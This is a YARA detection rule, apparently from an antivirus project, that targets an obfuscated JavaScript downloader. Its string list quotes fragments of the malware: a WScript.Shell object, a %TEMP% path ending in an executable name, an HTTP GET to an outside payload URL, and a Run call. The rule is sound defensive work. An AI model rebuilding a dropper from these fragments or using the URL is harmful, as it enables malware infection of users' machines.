rule sig_20160328_3cb8d524b16217165f243fb942ad1cf1 {
  meta:
    description = "datamaliciousorder - file 20160328_3cb8d524b16217165f243fb942ad1cf1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fa3890530fe3df862e82d1607c1763f79953e2fbdf6ab78b1072eefc293d8de1"

  strings:
    $s1  = "function Rshmtvqby() {return Wozqjt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"R8N6r70TXPsUZXQ.exe\";};" fullword ascii
    $s2  = "do {WScript[Rhowbl](Xfvkjodidu() * 11)} while (Ezfxzgv[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Ezfxzgv[Irnoj](\"GET\", \"http://energyunlimited.co.nz/o2apf\", false);" fullword ascii
    $s4  = "var Wozqjt = function Eobzea() {return WScript[Lwcfzkihu](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Zevzg(Sqptypw, Shkofy){return Sqptypw - Shkofy;};" fullword ascii
    $s6  = "function Hjhsvzg() {return ((Lurdbmzjup == true) && (Lurdbmzjup == Tdmord)) ? 1 : Watwi;};" fullword ascii
    $s7  = "function Qjcqrhfh(Xtapaupbqe){Wozqjt[\"Run\"](Xtapaupbqe, Watwi, Watwi);};" fullword ascii
    $s8  = "Lurdbmzjup = true; " fullword ascii
    $s9  = "var Lurdbmzjup = false;" fullword ascii
    $s10 = "function Avsay()" fullword ascii
    $s11 = "var Hzllgiyvz = false;" fullword ascii
    $s12 = "Tdmord = true; " fullword ascii
    $s13 = "function Xfvkjodidu(){return 22;};" fullword ascii
    $s14 = "function Yhgexpof(){return Lwcfzkihu;};" fullword ascii
    $s15 = "var Dmjlachhc = new this[\"Date\"]();" fullword ascii
    $s16 = "function Uohvf(Tlpitsd) {var Opxhrbwm = (1, 2, 3, 4, 5, Tlpitsd); return Opxhrbwm;};" fullword ascii
    $s17 = "var Tdmord = false;" fullword ascii
    $s18 = " while (Rinvabrji){" fullword ascii
    $s19 = "function Pdrxw(){return Soajcgw;};" fullword ascii
    $s20 = "return Zevzg(Wfqpylr, Ytbfkhkwx);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}